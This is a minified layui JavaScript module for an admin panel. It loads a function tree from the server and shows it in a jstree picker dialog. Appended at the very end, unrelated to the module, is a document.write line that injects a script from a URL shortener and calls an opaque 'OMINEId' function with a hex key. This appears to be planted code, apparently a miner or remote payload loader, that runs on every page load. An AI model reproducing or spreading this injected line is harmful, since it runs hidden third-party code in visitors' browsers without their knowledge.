"use strict";layui.define(["layer","form"],function(e){var n,c,i,t,a,o=layui.layer;layui.form;t={},a=function(e){(function t(e,c){c=c||1,e&&$.isArray(e)&&$.each(e,function(e,n){n.state={},n.text=1===c?(n.state.opened=!0,n.name):2===c?n.name:n.function_name,n.children&&t(n.children,c+1)})})(n=e),c=!0,i&&s()},$.get("/Admin/Sys/sysFunction",t,function(e){0===(e=$.parseJSON(e)).error&&a(e.data)});var s=function(t){var a;c?o.open({title:"选择功能",type:0,area:["370px","500px"],content:'<div class="select-function-tree" style="height: 100%;overflow: auto"></div>',success:function(){$(".select-function-tree").jstree({core:{data:n,check_callback:!0,multiple:!1}}).on("changed.jstree",function(e,t){if("select_node"===t.action&&t.selected.length){var c=t.node,n=c.original;a=!!n.function_id&&c,t.instance.open_node(t.selected[0]);var i=t.instance.get_node(c.parent);$.each(i.children,function(e,n){n!==c.id&&t.instance.close_node(n)})}})},yes:function(e,n){a?(t&&t(a),o.close(e)):o.tips("必须选择并且是第三层功能",".layui-layer-btn0")}}):i=!0};e("selectFunction",{start:s,initInput:function(e,t,c){var i=this;e=e||".jl-select-function",c=c||"text",$(e).click(function(){var n=$(this);i.start(function(e){n.val(e[c]),t&&t(e,n)})})}})});
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
